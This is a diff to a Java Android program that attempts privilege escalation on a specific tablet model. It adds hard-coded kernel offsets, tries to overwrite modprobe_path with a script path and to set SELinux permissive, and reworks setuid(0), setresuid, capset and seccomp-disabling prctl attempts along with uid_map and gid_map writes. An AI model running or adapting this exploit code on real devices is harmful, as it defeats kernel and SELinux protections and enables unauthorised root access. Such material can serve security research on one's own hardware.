@@ -16,7 +16,6 @@ import java.io.OutputStreamWriter;
 import java.io.PrintWriter;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.lang.reflect.Proxy;
 import java.nio.charset.StandardCharsets;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -29,7 +28,18 @@ public class Main {
     private static StringBuilder logBuilder = new StringBuilder();
     private static AtomicBoolean stopRequested = new AtomicBoolean(false);
 
-    // SIGSYS ハンドラが正常に設定されたかどうかのフラグ
+    private static final long KIMAGE_TEXT_BASE = 0xffffff8008080000L;
+    private static final long INIT_TASK_OFF = 0x1d7ec00L;
+    private static final long MODPROBE_PATH_OFF = 0x1ba8050L;
+    private static final long SELINUX_ENFORCING_OFF = 0x1bdf768L;
+    private static final long ASHMEM_MISC_OFF = 0x1ca9cf8L;
+    private static final long CONFIGFS_READ_FILE_OFF = 0x0023ebc0L;
+    private static final long CONFIGFS_WRITE_FILE_OFF = 0x0023f154L;
+
+    private static final long MODPROBE_PATH = KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF;
+    private static final long SELINUX_ENFORCING = KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF;
+    private static final long ASHMEM_MISC = KIMAGE_TEXT_BASE + ASHMEM_MISC_OFF;
+
     private static volatile boolean sigSysHandlerInstalled = false;
 
     public static void main(String[] args) {
@@ -59,16 +69,19 @@ public class Main {
         appendLog("========== PHASE 3: File System Exploration ==========");
         exploreDeepFiles();
 
-        appendLog("========== PHASE 4: setuid 0 Bruteforce Attempts (ENHANCED) ==========");
+        appendLog("========== PHASE 4: Kernel Offset Exploitation (offsets.h) ==========");
+        attemptKernelOffsetExploit();
+
+        appendLog("========== PHASE 5: setuid 0 Bruteforce Attempts ==========");
         attemptSetuid0();
 
-        appendLog("========== PHASE 5: Binder Transaction Fuzzing ==========");
+        appendLog("========== PHASE 6: Binder Transaction Fuzzing ==========");
         fuzzBinderTransactions();
 
-        appendLog("========== PHASE 6: Process Attribute Manipulation ==========");
+        appendLog("========== PHASE 7: Process Attribute Manipulation ==========");
         manipulateProcessAttributes();
 
-        appendLog("========== PHASE 7: /proc/self Exploitation ==========");
+        appendLog("========== PHASE 8: /proc/self Exploitation ==========");
         exploitProcSelf();
 
         appendLog("========== ALL TESTS COMPLETED ==========");
@@ -119,255 +132,270 @@ public class Main {
         return null;
     }
 
-    // ==================== 追加: SIGSYS ハンドラ設定ユーティリティ ====================
-    private static void setupSigSysHandler() {
-        try {
-            // sun.misc.Signal と sun.misc.SignalHandler をリフレクションでロード
-            Class<?> signalClass = Class.forName("sun.misc.Signal");
-            Class<?> handlerClass = Class.forName("sun.misc.SignalHandler");
+    private static void attemptKernelOffsetExploit() {
+        appendLog("[KERNEL] Using offsets.h for KC-T302DT (SZJ202)");
+        appendLog("[KERNEL] KIMAGE_TEXT_BASE = 0x" + Long.toHexString(KIMAGE_TEXT_BASE));
+        appendLog("[KERNEL] MODPROBE_PATH    = 0x" + Long.toHexString(MODPROBE_PATH));
+        appendLog("[KERNEL] SELINUX_ENFORCING= 0x" + Long.toHexString(SELINUX_ENFORCING));
+        appendLog("[KERNEL] ASHMEM_MISC      = 0x" + Long.toHexString(ASHMEM_MISC));
 
-            // 無名ハンドラの作成 (Proxy を使用)
-            Object handler = Proxy.newProxyInstance(
-                handlerClass.getClassLoader(),
-                new Class<?>[]{handlerClass},
-                (proxy, method, args) -> {
-                    if ("handle".equals(method.getName())) {
-                        appendLog("[SIGNAL] Caught SIGSYS (seccomp). Preventing crash.");
-                        return null;
-                    }
-                    return null;
+        File modprobeSys = new File("/proc/sys/kernel/modprobe");
+        if (modprobeSys.exists()) {
+            String current = readSmallFile(modprobeSys.getAbsolutePath());
+            appendLog("[KERNEL] /proc/sys/kernel/modprobe = " + (current == null ? "N/A" : current.trim()));
+            appendLog("[KERNEL] canRead=" + modprobeSys.canRead() + ", canWrite=" + modprobeSys.canWrite());
+            if (modprobeSys.canWrite()) {
+                appendLog("[KERNEL] >>> WRITABLE! Attempting to overwrite with /data/local/tmp/poc.sh");
+                try (FileOutputStream fos = new FileOutputStream(modprobeSys)) {
+                    fos.write("/data/local/tmp/poc.sh".getBytes(StandardCharsets.UTF_8));
+                    fos.write('\n');
+                    appendLog("[KERNEL] [SUCCESS] Overwrote modprobe_path");
+                } catch (Exception e) {
+                    appendLog("[KERNEL] Write failed: " + e.getMessage());
                 }
-            );
+            } else {
+                appendLog("[KERNEL] /proc/sys/kernel/modprobe is read-only (expected)");
+            }
+        } else {
+            appendLog("[KERNEL] /proc/sys/kernel/modprobe not found");
+        }
 
-            // Signal インスタンス生成 (new Signal("SYS"))
-            java.lang.reflect.Constructor<?> signalCtor = signalClass.getConstructor(String.class);
-            Object sysSignal = signalCtor.newInstance("SYS");
+        File selinuxEnforce = new File("/sys/fs/selinux/enforce");
+        if (selinuxEnforce.exists()) {
+            String enforce = readSmallFile(selinuxEnforce.getAbsolutePath());
+            appendLog("[KERNEL] SELinux enforce = " + (enforce == null ? "N/A" : enforce.trim()));
+            appendLog("[KERNEL] canRead=" + selinuxEnforce.canRead() + ", canWrite=" + selinuxEnforce.canWrite());
+            if (selinuxEnforce.canWrite()) {
+                appendLog("[KERNEL] >>> WRITABLE! Attempting to set permissive (0)");
+                try (FileOutputStream fos = new FileOutputStream(selinuxEnforce)) {
+                    fos.write("0".getBytes(StandardCharsets.UTF_8));
+                    fos.write('\n');
+                    appendLog("[KERNEL] [SUCCESS] SELinux set to permissive");
+                } catch (Exception e) {
+                    appendLog("[KERNEL] Write failed: " + e.getMessage());
+                }
+            } else {
+                appendLog("[KERNEL] /sys/fs/selinux/enforce is read-only");
+            }
+        } else {
+            appendLog("[KERNEL] /sys/fs/selinux/enforce not found");
+        }
 
-            // Signal.handle(Signal, SignalHandler) を呼び出す
-            Method handleMethod = signalClass.getMethod("handle", signalClass, handlerClass);
-            handleMethod.invoke(null, sysSignal, handler);
+        File ashmem = new File("/dev/ashmem");
+        appendLog("[KERNEL] /dev/ashmem exists=" + ashmem.exists() +
+                ", canRead=" + ashmem.canRead() +
+                ", canWrite=" + ashmem.canWrite());
+        if (ashmem.exists()) {
+            try {
+                FileInputStream fis = new FileInputStream(ashmem);
+                appendLog("[KERNEL]   Opened /dev/ashmem for reading (FD=" + fis.getFD() + ")");
+                fis.close();
+            } catch (Exception e) {
+                appendLog("[KERNEL]   Failed to open /dev/ashmem: " + e.getMessage());
+            }
+            try {
+                FileOutputStream fos = new FileOutputStream(ashmem);
+                appendLog("[KERNEL]   Opened /dev/ashmem for writing");
+                fos.close();
+            } catch (Exception e) {
+                appendLog("[KERNEL]   Failed to open /dev/ashmem for write: " + e.getMessage());
+            }
+        }
 
-            sigSysHandlerInstalled = true;
-            appendLog("[SIGNAL] SIGSYS handler installed successfully via reflection.");
-        } catch (Throwable t) {
-            sigSysHandlerInstalled = false;
-            appendLog("[SIGNAL] SIGSYS handler installation FAILED: " + t.getMessage());
-            appendLog("[SIGNAL] Native syscalls (libcore.io.Os) will be SKIPPED to avoid crash.");
+        File configfs = new File("/sys/kernel/config");
+        appendLog("[KERNEL] /sys/kernel/config exists=" + configfs.exists() + ", isDir=" + configfs.isDirectory());
+        if (configfs.exists() && configfs.isDirectory()) {
+            String[] items = configfs.list();
+            appendLog("[KERNEL]   configfs entries: " + (items == null ? 0 : items.length));
+            if (items != null && items.length > 0) {
+                appendLog("[KERNEL]   Sample: " + items[0]);
+            }
+            File testFile = new File(configfs, "poc_test");
+            try {
+                if (testFile.createNewFile()) {
+                    appendLog("[KERNEL]   [SUCCESS] Created file in configfs");
+                    testFile.delete();
+                } else {
+                    appendLog("[KERNEL]   Cannot create file in configfs (expected without mkdir)");
+                }
+            } catch (Exception e) {
+                appendLog("[KERNEL]   configfs write test failed: " + e.getMessage());
+            }
+        }
+
+        String status = readSmallFile("/proc/self/status");
+        if (status != null) {
+            for (String line : status.split("\n")) {
+                if (line.startsWith("Seccomp:")) {
+                    appendLog("[KERNEL] Seccomp: " + line.trim());
+                }
+            }
+        }
+        appendLog("[KERNEL] Offset-based exploitation pre-check completed");
+    }
+
+    private static String readSmallFile(String path) {
+        File f = new File(path);
+        if (!f.exists() || !f.canRead()) return null;
+        try (FileInputStream fis = new FileInputStream(f);
+             java.io.InputStreamReader isr = new java.io.InputStreamReader(fis, StandardCharsets.UTF_8);
+             java.io.BufferedReader br = new java.io.BufferedReader(isr)) {
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) {
+                sb.append(line).append("\n");
+            }
+            return sb.toString();
+        } catch (Exception e) {
+            return null;
         }
     }
 
-    // ==================== 差し替え後の attemptSetuid0 ====================
-    private static void attemptSetuid0() {
-        appendLog("[SETUID] Attempting various setuid 0 techniques (ENHANCED with SIGSYS protection)...");
+    private static void setupSigSysHandler() {
+        try {
+            Class<?> signalClass = Class.forName("sun.misc.Signal");
+            Class<?> handlerClass = Class.forName("sun.misc.SignalHandler");
+            Object handler = java.lang.reflect.Proxy.newProxyInstance(
+                    handlerClass.getClassLoader(),
+                    new Class<?>[]{handlerClass},
+                    (proxy, method, args) -> {
+                        if ("handle".equals(method.getName())) {
+                            appendLog("[SIGNAL] Caught SIGSYS (seccomp). Preventing crash.");
+                            return null;
+                        }
+                        return null;
+                    }
+            );
+            java.lang.reflect.Constructor<?> signalCtor = signalClass.getConstructor(String.class);
+            Object sysSignal = signalCtor.newInstance("SYS");
+            Method handleMethod = signalClass.getMethod("handle", signalClass, handlerClass);
+            handleMethod.invoke(null, sysSignal, handler);
+            sigSysHandlerInstalled = true;
+            appendLog("[SIGNAL] SIGSYS handler installed successfully.");
+        } catch (Throwable t) {
+            sigSysHandlerInstalled = false;
+            appendLog("[SIGNAL] SIGSYS handler installation FAILED: " + t.getMessage());
+            appendLog("[SIGNAL] Native syscalls will be SKIPPED.");
+        }
+    }
 
-        // 1. SIGSYS ハンドラを設定 (seccomp による強制終了を防止)
+    private static void attemptSetuid0() {
+        appendLog("[SETUID] Attempting various setuid 0 techniques (ENHANCED)...");
         setupSigSysHandler();
 
-        // -------- A. libcore.io.Os 経由のシステムコール (ハンドラが有効な時のみ実行) --------
         if (sigSysHandlerInstalled) {
-            appendLog("[SETUID] --- Testing libcore.io.Os syscalls (protected by handler) ---");
-
-            // setreuid
+            appendLog("[SETUID] --- Testing libcore.io.Os syscalls ---");
             try {
                 Class<?> osClass = Class.forName("libcore.io.Os");
-                Method setreuidMethod = osClass.getMethod("setreuid", int.class, int.class);
                 Class<?> libcore = Class.forName("libcore.io.Libcore");
                 Field osField = libcore.getField("os");
                 Object os = osField.get(null);
-                appendLog("  Trying Os.setreuid(0,0)");
-                setreuidMethod.invoke(os, 0, 0);
-                appendLog("  [SUCCESS] Os.setreuid(0,0) returned successfully (unexpected!)");
-            } catch (Exception e) {
-                appendLog("  Os.setreuid(0,0) exception: " + e.getMessage());
-            }
 
-            // setresuid
-            try {
-                Class<?> osClass = Class.forName("libcore.io.Os");
-                Method setresuidMethod = osClass.getMethod("setresuid", int.class, int.class, int.class);
-                Class<?> libcore = Class.forName("libcore.io.Libcore");
-                Field osField = libcore.getField("os");
-                Object os = osField.get(null);
-                appendLog("  Trying Os.setresuid(0,0,0)");
-                setresuidMethod.invoke(os, 0, 0, 0);
-                appendLog("  [SUCCESS] Os.setresuid(0,0,0) returned successfully");
-            } catch (Exception e) {
-                appendLog("  Os.setresuid(0,0,0) exception: " + e.getMessage());
-            }
+                try {
+                    Method m = osClass.getMethod("setreuid", int.class, int.class);
+                    appendLog("  Trying Os.setreuid(0,0)");
+                    m.invoke(os, 0, 0);
+                    appendLog("  [SUCCESS] Os.setreuid(0,0) returned!");
+                } catch (Exception e) {
+                    appendLog("  Os.setreuid(0,0) exception: " + e.getMessage());
+                }
 
-            // setregid
-            try {
-                Class<?> osClass = Class.forName("libcore.io.Os");
-                Method setregidMethod = osClass.getMethod("setregid", int.class, int.class);
-                Class<?> libcore = Class.forName("libcore.io.Libcore");
-                Field osField = libcore.getField("os");
-                Object os = osField.get(null);
-                appendLog("  Trying Os.setregid(0,0)");
-                setregidMethod.invoke(os, 0, 0);
-                appendLog("  [SUCCESS] Os.setregid(0,0) returned successfully");
-            } catch (Exception e) {
-                appendLog("  Os.setregid(0,0) exception: " + e.getMessage());
-            }
+                try {
+                    Method m = osClass.getMethod("setresuid", int.class, int.class, int.class);
+                    appendLog("  Trying Os.setresuid(0,0,0)");
+                    m.invoke(os, 0, 0, 0);
+                    appendLog("  [SUCCESS] Os.setresuid(0,0,0) returned!");
+                } catch (Exception e) {
+                    appendLog("  Os.setresuid(0,0,0) exception: " + e.getMessage());
+                }
 
-            // setresgid
-            try {
-                Class<?> osClass = Class.forName("libcore.io.Os");
-                Method setresgidMethod = osClass.getMethod("setresgid", int.class, int.class, int.class);
-                Class<?> libcore = Class.forName("libcore.io.Libcore");
-                Field osField = libcore.getField("os");
-                Object os = osField.get(null);
-                appendLog("  Trying Os.setresgid(0,0,0)");
-                setresgidMethod.invoke(os, 0, 0, 0);
-                appendLog("  [SUCCESS] Os.setresgid(0,0,0) returned successfully");
-            } catch (Exception e) {
-                appendLog("  Os.setresgid(0,0,0) exception: " + e.getMessage());
-            }
+                try {
+                    Method m = osClass.getMethod("capset", long.class, long.class, long.class);
+                    appendLog("  Trying Os.capset(0,0,0)");
+                    m.invoke(os, 0L, 0L, 0L);
+                    appendLog("  [SUCCESS] Os.capset succeeded");
+                } catch (NoSuchMethodException e) {
+                    appendLog("  Os.capset not available");
+                } catch (Exception e) {
+                    appendLog("  Os.capset exception: " + e.getMessage());
+                }
 
-            // capset
-            try {
-                Class<?> osClass = Class.forName("libcore.io.Os");
-                Method capsetMethod = osClass.getMethod("capset", long.class, long.class, long.class);
-                Class<?> libcore = Class.forName("libcore.io.Libcore");
-                Field osField = libcore.getField("os");
-                Object os = osField.get(null);
-                appendLog("  Trying Os.capset(0,0,0)");
-                capsetMethod.invoke(os, 0L, 0L, 0L);
-                appendLog("  [SUCCESS] Os.capset succeeded");
-            } catch (NoSuchMethodException e) {
-                appendLog("  Os.capset not available");
+                try {
+                    Method m = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
+                    appendLog("  Trying prctl(PR_SET_SECCOMP, 0)");
+                    m.invoke(os, 22, 0, 0, 0, 0);
+                    appendLog("  prctl returned");
+                } catch (Exception e) {
+                    appendLog("  prctl exception: " + e.getMessage());
+                }
             } catch (Exception e) {
-                appendLog("  Os.capset exception: " + e.getMessage());
+                appendLog("  libcore.io.Os setup failed: " + e.getMessage());
             }
-
-            // prctl (seccomp 無効化試行)
-            try {
-                Class<?> osClass = Class.forName("libcore.io.Os");
-                Method prctlMethod = osClass.getMethod("prctl", int.class, int.class, int.class, int.class, int.class);
-                Class<?> libcore = Class.forName("libcore.io.Libcore");
-                Field osField = libcore.getField("os");
-                Object os = osField.get(null);
-                int PR_SET_SECCOMP = 22;
-                appendLog("  Trying prctl(PR_SET_SECCOMP, 0)");
-                prctlMethod.invoke(os, PR_SET_SECCOMP, 0, 0, 0, 0);
-                appendLog("  prctl returned (likely not effective)");
-            } catch (Exception e) {
-                appendLog("  prctl exception: " + e.getMessage());
-            }
-
         } else {
-            appendLog("[SETUID] --- Skipping libcore.io.Os syscalls (handler not available) ---");
+            appendLog("[SETUID] --- Skipping libcore.io.Os syscalls ---");
         }
 
-        // -------- B. android.os.Process API (安全: 例外で失敗するがクラッシュしない) --------
         appendLog("[SETUID] --- Testing android.os.Process APIs ---");
-
         try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setuidMethod = processClass.getDeclaredMethod("setuid", int.class);
-            setuidMethod.setAccessible(true);
+            Class<?> pc = Class.forName("android.os.Process");
+            Method m = pc.getDeclaredMethod("setuid", int.class);
+            m.setAccessible(true);
             appendLog("  Trying Process.setuid(0)");
-            int result = (int) setuidMethod.invoke(null, 0);
-            appendLog("  Process.setuid(0) returned: " + result);
+            int ret = (int) m.invoke(null, 0);
+            appendLog("  Process.setuid(0) returned: " + ret);
         } catch (Exception e) {
             appendLog("  Process.setuid(0) exception: " + e.getMessage());
         }
 
         try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setgidMethod = processClass.getDeclaredMethod("setgid", int.class);
-            setgidMethod.setAccessible(true);
+            Class<?> pc = Class.forName("android.os.Process");
+            Method m = pc.getDeclaredMethod("setgid", int.class);
+            m.setAccessible(true);
             appendLog("  Trying Process.setgid(0)");
-            int result = (int) setgidMethod.invoke(null, 0);
-            appendLog("  Process.setgid(0) returned: " + result);
+            int ret = (int) m.invoke(null, 0);
+            appendLog("  Process.setgid(0) returned: " + ret);
         } catch (Exception e) {
             appendLog("  Process.setgid(0) exception: " + e.getMessage());
         }
 
         try {
-            Class<?> processClass = Class.forName("android.os.Process");
-            Method setgroupsMethod = processClass.getDeclaredMethod("setgroups", int[].class);
-            setgroupsMethod.setAccessible(true);
+            Class<?> pc = Class.forName("android.os.Process");
+            Method m = pc.getDeclaredMethod("setgroups", int[].class);
+            m.setAccessible(true);
             int[] groups = {0};
             appendLog("  Trying Process.setgroups([0])");
-            setgroupsMethod.invoke(null, (Object) groups);
-            appendLog("  [SUCCESS] Process.setgroups([0]) succeeded");
+            m.invoke(null, (Object) groups);
+            appendLog("  [SUCCESS] Process.setgroups([0])");
         } catch (Exception e) {
             appendLog("  Process.setgroups([0]) exception: " + e.getMessage());
         }
 
-        // -------- C. Runtime.setuid (deprecated) --------
         appendLog("[SETUID] --- Testing Runtime.setuid ---");
         try {
-            Method setuid = Runtime.class.getDeclaredMethod("setuid", int.class);
-            setuid.setAccessible(true);
+            Method m = Runtime.class.getDeclaredMethod("setuid", int.class);
+            m.setAccessible(true);
             appendLog("  Trying Runtime.setuid(0)");
-            int result = (int) setuid.invoke(Runtime.getRuntime(), 0);
-            appendLog("  Runtime.setuid(0) returned: " + result);
+            int ret = (int) m.invoke(Runtime.getRuntime(), 0);
+            appendLog("  Runtime.setuid(0) returned: " + ret);
         } catch (Exception e) {
             appendLog("  Runtime.setuid(0) exception: " + e.getMessage());
         }
 
-        // -------- D. /proc/self/ ファイル操作 (ユーザー名前空間) --------
-        appendLog("[SETUID] --- Testing /proc/self/ namespace files ---");
-
-        // uid_map
-        try {
-            File uidMap = new File("/proc/self/uid_map");
-            if (uidMap.exists() && uidMap.canWrite()) {
-                appendLog("  Writing to /proc/self/uid_map");
-                try (FileOutputStream fos = new FileOutputStream(uidMap)) {
+        appendLog("[SETUID] --- Testing /proc/self/ namespace ---");
+        for (String name : new String[]{"uid_map", "gid_map", "setgroups"}) {
+            File f = new File("/proc/self/" + name);
+            appendLog("  /proc/self/" + name + " exists=" + f.exists() + ", writable=" + f.canWrite());
+            if (f.exists() && f.canWrite()) {
+                try (FileOutputStream fos = new FileOutputStream(f)) {
                     fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  [SUCCESS] Wrote to uid_map");
+                    appendLog("    Wrote to " + name);
                 } catch (Exception e) {
-                    appendLog("  uid_map write failed: " + e.getMessage());
+                    appendLog("    Write to " + name + " failed: " + e.getMessage());
                 }
-            } else {
-                appendLog("  /proc/self/uid_map not writable (exists=" + uidMap.exists() + ")");
             }
-        } catch (Exception e) {
-            appendLog("  uid_map error: " + e.getMessage());
         }
-
-        // gid_map
-        try {
-            File gidMap = new File("/proc/self/gid_map");
-            if (gidMap.exists() && gidMap.canWrite()) {
-                appendLog("  Writing to /proc/self/gid_map");
-                try (FileOutputStream fos = new FileOutputStream(gidMap)) {
-                    fos.write("0 0 1\n".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  [SUCCESS] Wrote to gid_map");
-                } catch (Exception e) {
-                    appendLog("  gid_map write failed: " + e.getMessage());
-                }
-            } else {
-                appendLog("  /proc/self/gid_map not writable (exists=" + gidMap.exists() + ")");
-            }
-        } catch (Exception e) {
-            appendLog("  gid_map error: " + e.getMessage());
-        }
-
-        // setgroups ファイル (補助グループ制限)
-        try {
-            File setgroupsFile = new File("/proc/self/setgroups");
-            if (setgroupsFile.exists() && setgroupsFile.canWrite()) {
-                appendLog("  Writing 'allow' to /proc/self/setgroups");
-                try (FileOutputStream fos = new FileOutputStream(setgroupsFile)) {
-                    fos.write("allow\n".getBytes(StandardCharsets.UTF_8));
-                    appendLog("  [SUCCESS] Wrote to setgroups");
-                } catch (Exception e) {
-                    appendLog("  setgroups write failed: " + e.getMessage());
-                }
-            } else {
-                appendLog("  /proc/self/setgroups not writable");
-            }
-        } catch (Exception e) {
-            appendLog("  setgroups error: " + e.getMessage());
-        }
-
         appendLog("[SETUID] All setuid-related attempts completed.");
     }
-
-    // ==================== 以下、元のコードと同一 ====================
 
     private static void testSystemProperties() {
         appendLog("[SYS] SystemProperties manipulation...");
@@ -440,21 +468,11 @@ public class Main {
     private static void exploreDeepFiles() {
         appendLog("[FS] Deep file exploration...");
         String[] procFiles = {
-            "/proc/self/status",
-            "/proc/self/maps",
-            "/proc/self/smaps",
-            "/proc/self/limits",
-            "/proc/self/statm",
-            "/proc/self/cgroup",
-            "/proc/version",
-            "/proc/meminfo",
-            "/proc/cpuinfo",
-            "/proc/self/attr/current",
-            "/proc/self/attr/prev",
-            "/proc/self/attr/exec",
-            "/proc/self/oom_score_adj",
-            "/proc/self/comm",
-            "/proc/self/cmdline"
+            "/proc/self/status", "/proc/self/maps", "/proc/self/smaps",
+            "/proc/self/limits", "/proc/self/statm", "/proc/self/cgroup",
+            "/proc/version", "/proc/meminfo", "/proc/cpuinfo",
+            "/proc/self/attr/current", "/proc/self/attr/prev", "/proc/self/attr/exec",
+            "/proc/self/oom_score_adj", "/proc/self/comm", "/proc/self/cmdline"
         };
         for (String p : procFiles) {
             if (stopRequested.get()) break;
@@ -488,13 +506,8 @@ public class Main {
         }
 
         String[] sensitiveDirs = {
-            "/data/data",
-            "/data/system",
-            "/data/misc",
-            "/data/property",
-            "/dev",
-            "/sys",
-            "/proc"
+            "/data/data", "/data/system", "/data/misc", "/data/property",
+            "/dev", "/sys", "/proc"
         };
         for (String d : sensitiveDirs) {
             File f = new File(d);
